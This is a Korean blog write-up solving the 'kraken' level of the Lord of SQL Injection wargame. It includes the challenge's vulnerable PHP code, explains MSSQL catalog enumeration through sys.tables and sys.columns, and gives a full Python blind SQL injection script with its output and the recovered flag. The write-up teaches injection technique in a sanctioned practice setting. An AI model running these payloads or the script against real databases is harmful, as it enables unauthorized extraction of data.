---
title: "[Lord of SQL Injection] LoS - kraken 문제풀이"
date: 2019-08-04
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번 문제의 이름은 `kraken`이다.
이 문제는 `poltergeist`와 유사 한 문제이다.  

<!--more-->

코드는 다음과 같다.  

```php
---------------------------------
query : select id from member where id='' and pw=''
---------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = mssql_connect("kraken");
  if(preg_match('/master|information|;/i', $_GET['id'])) exit("No Hack ~_~");
  if(preg_match('/master|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select id from member where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result['id']) echo "<h2>{$result['id']}</h2>";

  if($krakenFlag === $_GET['pw']) solve("kraken");// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
  highlight_file(__FILE__);
?>
```

플래그는 `flag_{$hash}` 테이블 안에 있다고 한다.
따라서 이 문제를 풀기 위해서는 `flag_$hash` 형태의 테이블 명을 알아야 하고, 해당 테이블의 컬럼 명, 그 다음에는 플래그 값을 찾아야 한다.
그래서 이 전에 풀었던 문제인 `poltergeist`에서 구현한 소스코드에서 쿼리를 살짝 바꾸어 주었다.

`poltergeist`에서는 `sqlite_master` 테이블에서 `sql`을 검색하여 테이블 명과 컬럼 명을 알아낼 수 있었다.
그런데 `MSSQL`에서는 이런 식으로 한번에 테이블 구조를 볼 수 있는 테이블이 없는 것 같다.
그래서 `sys.tables`라는 테이블에서 테이블 명을 찾을 수 있었다.
쿼리는 다음과 같다.  

```mysql
select name from sys.tables where name like 'flag_%'
```

여기서 `name`이 `테이블 명`이 저장되어 있는 컬럼이다.
위의 쿼리를 사용하여 한 글자 씩 테이블 명을 알아낸 후, 컬럼명을 알아내야 하는데, 문제는 알아낸 테이블 명만으로는 컬럼명을 알아낼 수 있는 방법이 없다는 것이었다.
그래서 다시 `sys.tables`에서 `object_id`라는 것을 추출했다.  

```mysql
select object_id from sys.tables where name=TABLE_NAME
```

`object_id`는 `9글자의 숫자`로 이루어져 있었는데, 해당 값을 숫자가 너무 커서 이진 탐색 방법으로 찾아내도록 코드를 구현했다.
앞의 `sys.tables`에는 테이블에 대한 정보가 저장되어 있었는데, 컬럼에 대한 것은 `sys.columns`에 저장되어 있다.
이 때, `object_id`는 `개체의 ID`로 데이터베이스 내에서 고유한 값이다.
때문에 한 `sys.tables`에 저장 된 각 테이블은 고유한 `object_id`의 값을 가진다.

또한 `sys.columns` 테이블에서는 `column`에 대한 정보를 저장하는데, 이 때 `object_id`을 통해 `해당 열이 속한 개체의 ID` 값을 저장 해 해당 열이 어떤 테이블에 속한 지 식별할 수 있게 해 준다.
따라서 앞의 쿼리를 통해 구한 `object_id`를 사용하여 `sys.columns`에서 컬럼 명을 구할 수 있다.
이를 위한 쿼리는 다음과 같다.  

```mysql
select name from sys.columns where object_id=OBJECT_ID
```

여기서 `name`은 컬럼 명이다.
이렇게 하면 플래그 값을 추출하기 위한 `테이블 명`과 `컬럼 명`을 모두 알아낼 수 있게 된다.
최종적으로 아래의 쿼리를 다음과 같이 넣어 플래그 값을 추출하면 문제를 풀 수 있다.  

```mysql
select COLUMN from TABLE
```

---

```plain
?id=1&pw=1' or len(select COLUMN from TABLE)=0

?id=1&pw=1' or substring((select COLUMN from TABLE), 1, 1)='a
```

이를 코드로 구현해 보면 다음과 같다.  

```python
import requests

table = ""
column = ""
flag = ""
object_id = 0
length = 0

def testEqual(num):
	try:
		query = url + "1' or (select object_id from sys.tables where name = '" + table + "') = " + str(num) + " -- "
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"

	if 'guest' in r.text:
		return True
	else:
		return False

def testBigger(num):
	try:
		query = url + "1' or (select object_id from sys.tables where name = '" + table + "') < " + str(num) + " -- "
		r = requests.post(query, cookies=session)
	except:
		 print "[-] Error occur"

	if 'guest' in r.text:
		return True
	else:
		return False

def search_id(start, end):
	if start > end:
		return "None"

	mid = (start + end) / 2

	if testEqual(mid):
		return mid
	elif testBigger(mid):
		end = mid - 1
	else:
		start = mid + 1

	return search_id(start, end)

url = "https://los.rubiya.kr/chall/kraken_647f3513b94339a4c59cf6f9074d0f92.php?id=1&pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the table"

for i in range(0, 40):
	try:
		query = url + "1' or len((select name from sys.tables where name like 'flag_%'))=" + str(i) + " -- "
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue

	if 'guest' in r.text:
		length = i
		break

print "[+] Found length : ", length

print "[+] Find table"

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "1' or substring((select name from sys.tables where name like 'flag_%'), " + str(j) + ", 1)='" + chr(i)
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'guest' in r.text:
			table += chr(i)
			print "[+] Found " + str(j), ":", table
			break

table = table.lower()
print "[+] Found table : ", table

length = 0

print "[+] Find length of the object_id"

for i in range(0, 40):
        try:
                query = url + "1' or len((select object_id from sys.tables where name = '" + table + "'))=" + str(i) + " -- "
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
                continue

        if 'guest' in r.text:
                length = i
                break

print "[+] Found length : ", length

print "[+] Find object_id"

object_id = search_id(100000000, 999999999)

print "[+] Found object_id : ", object_id

length = 0

print "[+] Find length of the column"

for i in range(0, 100):
        try:
                query = url + "1' or len((select name from sys.columns where object_id = " + str(object_id) + "))=" + str(i) + " -- "
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
                continue

        if 'guest' in r.text:
                length = i
                break

print "[+] Found length : ", length

print "[+] Find column"

for j in range(1, length + 1):
        for i in range(32, 128):
                try:
                        query = url + "1' or substring((select name from sys.columns where object_id = " + str(object_id)  + "), " + str(j) + ", 1)='" + chr(i)
                        r = requests.post(query, cookies=session)
                except:
                        print "[-] Error occur"
                        continue

                if 'guest' in r.text:
                        column += chr(i)
                        print "[+] Found " + str(j), ":", column
                        break

column = column.lower()
print "[+] Found column : ", column

length = 0
print "[+] Find length of the flag"

for i in range(0, 100):
        try:
                query = url + "1' or len((select " + column + " from " + table + "))=" + str(i) + " -- "
                r = requests.post(query, cookies=session)
        except:
                print "[-] Error occur"
                continue

        if 'guest' in r.text:
                length = i
                break

print "[+] Found length : ", length

print "[+] Find flag"

for j in range(1, length + 1):
        for i in range(32, 128):
                try:
                        query = url + "1' or substring((select " + column + " from " + table + "), " + str(j) + ", 1)='" + chr(i)
                        r = requests.post(query, cookies=session)
                except:
                        print "[-] Error occur"
                        continue

                if 'guest' in r.text:
                        flag += chr(i)
                        print "[+] Found " + str(j), ":", flag
                        break

print "[+] Found flag : ", flag.lower()
print "[+] End"
```

그 결과 아래와 같이 플래그를 얻을 수 있다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the table
[+] Found length :  13
[+] Find table
[+] Found 1 : F
[+] Found 2 : FL
[+] Found 3 : FLA
[+] Found 4 : FLAG
[+] Found 5 : FLAG_
[+] Found 6 : FLAG_C
[+] Found 7 : FLAG_CC
[+] Found 8 : FLAG_CCD
[+] Found 9 : FLAG_CCDF
[+] Found 10 : FLAG_CCDFE
[+] Found 11 : FLAG_CCDFE6
[+] Found 12 : FLAG_CCDFE62
[+] Found 13 : FLAG_CCDFE62B
[+] Found table :  flag_ccdfe62b
[+] Find length of the object_id
[+] Found length :  9
[+] Find object_id
[+] Found object_id :  901578250
[+] Find length of the column
[+] Found length :  13
[+] Find column
[+] Found 1 : F
[+] Found 2 : FL
[+] Found 3 : FLA
[+] Found 4 : FLAG
[+] Found 5 : FLAG_
[+] Found 6 : FLAG_A
[+] Found 7 : FLAG_AB
[+] Found 8 : FLAG_AB1
[+] Found 9 : FLAG_AB15
[+] Found 10 : FLAG_AB15B
[+] Found 11 : FLAG_AB15B6
[+] Found 12 : FLAG_AB15B60
[+] Found 13 : FLAG_AB15B600
[+] Found column :  flag_ab15b600
[+] Find length of the flag
[+] Found length :  38
[+] Find flag
[+] Found 1 : F
[+] Found 2 : FL
[+] Found 3 : FLA
[+] Found 4 : FLAG
[+] Found 5 : FLAG{
[+] Found 6 : FLAG{A
[+] Found 7 : FLAG{A0
[+] Found 8 : FLAG{A08
[+] Found 9 : FLAG{A081
[+] Found 10 : FLAG{A0819
[+] Found 11 : FLAG{A0819F
[+] Found 12 : FLAG{A0819FC
[+] Found 13 : FLAG{A0819FC5
[+] Found 14 : FLAG{A0819FC56
[+] Found 15 : FLAG{A0819FC56B
[+] Found 16 : FLAG{A0819FC56BE
[+] Found 17 : FLAG{A0819FC56BEA
[+] Found 18 : FLAG{A0819FC56BEAE
[+] Found 19 : FLAG{A0819FC56BEAE9
[+] Found 20 : FLAG{A0819FC56BEAE98
[+] Found 21 : FLAG{A0819FC56BEAE985
[+] Found 22 : FLAG{A0819FC56BEAE985B
[+] Found 23 : FLAG{A0819FC56BEAE985BA
[+] Found 24 : FLAG{A0819FC56BEAE985BAC
[+] Found 25 : FLAG{A0819FC56BEAE985BAC7
[+] Found 26 : FLAG{A0819FC56BEAE985BAC7D
[+] Found 27 : FLAG{A0819FC56BEAE985BAC7D1
[+] Found 28 : FLAG{A0819FC56BEAE985BAC7D17
[+] Found 29 : FLAG{A0819FC56BEAE985BAC7D175
[+] Found 30 : FLAG{A0819FC56BEAE985BAC7D175C
[+] Found 31 : FLAG{A0819FC56BEAE985BAC7D175C9
[+] Found 32 : FLAG{A0819FC56BEAE985BAC7D175C97
[+] Found 33 : FLAG{A0819FC56BEAE985BAC7D175C974
[+] Found 34 : FLAG{A0819FC56BEAE985BAC7D175C974C
[+] Found 35 : FLAG{A0819FC56BEAE985BAC7D175C974CD
[+] Found 36 : FLAG{A0819FC56BEAE985BAC7D175C974CD2
[+] Found 37 : FLAG{A0819FC56BEAE985BAC7D175C974CD27
[+] Found 38 : FLAG{A0819FC56BEAE985BAC7D175C974CD27}
[+] Found flag :  flag{a0819fc56beae985bac7d175c974cd27}
[+] End
```

나온 값에서 앞의 `flag`만 대문자로 바꾸어 넣어주어야 문제를 풀 수 있다.  

```plain
?pw=FLAG{a0819fc56beae985bac7d175c974cd27}
```

---

```php
----------------------------------------------------------------------------------------------------------------------------------
query : select id from member where id='admin' and pw='FLAG{a0819fc56beae985bac7d175c974cd27}'
----------------------------------------------------------------------------------------------------------------------------------

KRAKEN Clear!

<?php
  include "./config.php";
  login_chk();
  $db = mssql_connect("kraken");
  if(preg_match('/master|information|;/i', $_GET['id'])) exit("No Hack ~_~");
  if(preg_match('/master|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select id from member where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
  if($result['id']) echo "<h2>{$result['id']}</h2>";

  if($krakenFlag === $_GET['pw']) solve("kraken");// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
  highlight_file(__FILE__);
?>
```

---

```plain
KRAKEN Clear!!
```